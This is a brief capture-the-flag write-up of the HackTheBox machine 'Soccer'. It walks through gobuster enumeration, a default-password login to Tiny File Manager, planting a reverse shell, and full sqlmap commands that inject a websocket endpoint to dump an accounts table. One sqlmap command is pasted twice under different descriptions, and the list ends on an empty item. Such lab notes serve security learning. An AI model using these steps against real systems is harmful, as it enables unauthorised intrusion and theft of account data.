---
title: Soccer (linux Easy)
draft: false
type: HackTheBox
date: 2026-04-22T15:00:00-05:00
summary: Retired machine
---
## Enumeration
- ran an nmap scan and found ssh, http, and xmlmail on port 9091
- found a domain name to add to /etc/hosts `soccer.htb`
- lets run `gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- we find a directory that wasn't linked /tiny
- It gives us a log in to tinyfilemanager
- inspecting the page gives us the version number and now we have the default admin password to log in with
- We find a file we can write to and put a reverse shell in and connect to it.

## Part 2
- we found an nginx config file with another vertual host to check
- the vertual host is using websockets to  fetch tickets
- we run `sqlmap -u "ws://soc-player.soccer.htb:9091/" --data='{"id":"1"}' --batch -D soccer_db --tables --level 5 --risk 3` to get database names
- now we run `sqlmap -u "ws://soc-player.soccer.htb:9091/" --data='{"id":"1"}' --batch -D soccer_db --tables --level 5 --risk 3` to find the rows in that database, and we found accounts
- now we run `sqlmap -u "ws://soc-player.soccer.htb:9091/" --data='{"id":"1"}' --batch -D soccer_db -T accounts --dump --level 5 --risk 3` to dump the data
- 